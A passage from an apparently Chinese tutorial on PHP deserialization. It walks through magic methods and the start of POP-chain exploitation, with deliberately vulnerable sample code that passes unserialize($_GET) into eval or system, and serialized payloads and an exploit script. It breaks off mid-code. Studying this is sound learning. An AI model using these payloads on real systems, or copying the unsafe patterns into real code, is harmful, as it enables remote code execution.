   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);  </span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo &#x27;dazhuang666!!&#x27;;&quot;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086064-21ad18f0-0751-4f42-adbc-281bbe29830b.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">&quot;phpinfo();&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;cmd);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>sleep</strong><br>序列化的时候会检查类中是否存在一个魔术方法<code>__sleep</code><br>先执行sleep在序列化</p><p>触发时机：<strong>序列化serialize()之前</strong><br>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删<br>除不必要的属性。<br>参数：成员属性<br>返回值：需要被序列化存储的成员属性</p><p>sleep例题<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086158-a4795de4-1e94-4b07-92ad-599baadff00e.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$cmd</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以直接执行命令</p><p><code>__wakeup()</code>在反序列化之前<br><code>__destruct</code>在反序列化之后</p><p><strong>wakeup</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$user_ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>; <span class="comment">// 常量不参与序列化，无需处理  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;dir&quot;</span>;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="string">&#x27;test&#x27;</span>;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="string">&#x27;123456&#x27;</span>;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;order = <span class="string">&#x27;001&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tostring和invoke</p><p>tostring：常用构造pop链<br>类被当成字符串时的回应方法</p><p><code>__call</code>：调用一个不存在的方法</p><p>触发时机：调用一个不存在的方法<br>功能：<br>参数：2个参数传参<code>$arg1</code>,<code>$arg2</code><br>返回值：调用的不存在的方法的名称和参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">callxxx,a</span><br><span class="line">__callstatic</span><br></pre></td></tr></table></figure><p>触发时机：静态调用或调用成员常量时使用的方法不存在<br>功能：<br>参数：2个参数传参<code>$arg1</code>,<code>$arg2</code><br>返回值：调用的不存在的方法的名称和参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Warning: The magic method <span class="title function_ invoke__">__callStatic</span>() must have <span class="keyword">public</span> visibility <span class="keyword">and</span> be <span class="built_in">static</span> in D:\Soft\Penetration\TrafficTools\phpStudy\WWW\php_ser_Class\class10\<span class="number">2</span>.php on line <span class="number">5</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">callxxx,a</span><br></pre></td></tr></table></figure><table><thead><tr><th>特性</th><th><code>__call</code></th><th><code>__callStatic</code></th></tr></thead><tbody><tr><td><strong>触发时机</strong></td><td>调用<strong>对象实例的非静态、不存在 &#x2F; 不可访问</strong>方法时触发</td><td>调用<strong>类的静态、不存在 &#x2F; 不可访问</strong>方法时触发</td></tr><tr><td><strong>方法修饰符</strong></td><td>必须是 <code>public</code>（不能加 <code>static</code>）</td><td>必须是 <code>public static</code>（强制加 <code>static</code>）</td></tr><tr><td><strong>调用方式</strong></td><td>通过<strong>对象实例</strong>调用（<code>$obj-&gt;xxx()</code>）</td><td>通过<strong>类名</strong>调用（<code>Class::xxx()</code>），或对象实例静态调用（不推荐）</td></tr><tr><td><strong>上下文</strong></td><td>拥有对象上下文（可访问 <code>$this</code>）</td><td>无对象上下文（不可访问 <code>$this</code>，仅能访问静态属性 &#x2F; 方法）</td></tr><tr><td><strong>语法要求</strong></td><td>无 <code>static</code> 修饰，否则报错</td><td>必须加 <code>static</code> 修饰，否则报错</td></tr></tbody></table><p><code>__GET()</code><br>触发时机：调用的成员属性不存在<br>功能：<br>参数：传参$arg1<br>返回值：不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># var2</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>=<span class="string">&quot;benben&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;  </span><br><span class="line"><span class="variable">$test</span> -&gt;var1;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;var1;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># benben</span></span><br><span class="line">这里就没有调用GET</span><br></pre></td></tr></table></figure><p><code>__set()</code><br>触发时机：给不存在的成员属性赋值<br>功能：<br>参数：传参<code>$arg1</code>,<code>$arg2</code><br>返回值：不存在的成员属性的名称和赋的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># var2,1</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__isset()</span><br></pre></td></tr></table></figure><p>触发时机：对不可访问属性使用isset()或<br>empty(0时，isset0会被调用。<br>功能：<br>参数：传参5arg1<br>返回值：不存在的成员属性的名称</p><p>isset()用的成员属性var不可访问或不存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># var</span></span><br></pre></td></tr></table></figure><p><code>__unset()</code><br>触发时机：对不可访问属性使用unset()时<br>功能<br>参数：传参Sarg1<br>返回值：不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># var</span></span><br><span class="line"><span class="comment"># 返回不存在的成员属性的名称</span></span><br></pre></td></tr></table></figure><p><code>__invoke()</code>：把对象当成函数调用</p><p><code>__clone()</code><br>触发时机：当使用clone关键字拷贝完成一<br>个对象后，新对象会自动调用定义的魔术方<br>法<br>clone()<br>功能：<br>参数：<br>返回值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># __clone test</span></span><br><span class="line">    <span class="comment"># 先new了一个User然后把备份给newclass，会自动触发</span></span><br></pre></td></tr></table></figure><h2 id="pop链前置"><a href="#pop链前置" class="headerlink" title="pop链前置"></a>pop链前置</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反推法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用点</span><br><span class="line">eval($this-&gt;test2);</span><br><span class="line"></span><br><span class="line">action肯定不会被凭空执行</span><br><span class="line">找调用action</span><br><span class="line">destruct调用了action</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086223-4acab302-68ec-4279-8655-3f45346c1daf.jpg" alt="null"></p><p>定义test是一个对象并且它里面的值是obj evil<br>反序列化不会调用construct<br>实例化的时候才会调用contruct</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span 